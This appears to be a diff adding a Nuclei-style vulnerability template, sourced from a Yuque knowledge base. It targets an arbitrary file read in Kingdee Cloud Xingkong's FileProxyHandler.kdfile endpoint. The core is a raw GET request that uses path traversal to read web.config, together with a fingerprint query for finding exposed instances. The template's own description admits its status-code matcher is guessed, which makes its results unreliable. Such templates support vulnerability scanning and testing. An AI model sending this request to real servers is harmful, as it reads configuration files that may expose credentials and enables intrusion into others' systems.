@@ -1,0 +1,37 @@
+id: poc-c36eec813ce3d5f4e1b3
+info:
+  name: 金蝶云星空管理中心FileProxyHandler.kdfile任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/c36eec813ce3d5f4e1b3a99d93cd9f8d
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: c36eec813ce3d5f4e1b3a99d93cd9f8d
+    fofa: + hunter：`app.name="Kingdee 金蝶云星空"`
+http:
+- raw:
+  - 'GET /FileProxyHandler.kdfile?Area=0&F=..%2F..%2Fweb.config&Ope=SDL&Step=100000 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Cookie: ASP.NET_SessionId=rtanmcljbthsauvcfgff504m; Theme=standard; kdservice-sessionid=349316fc-dc0f-4a57-8cf4-20ba7b60e989
+
+    Upgrade-Insecure-Requests: 1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
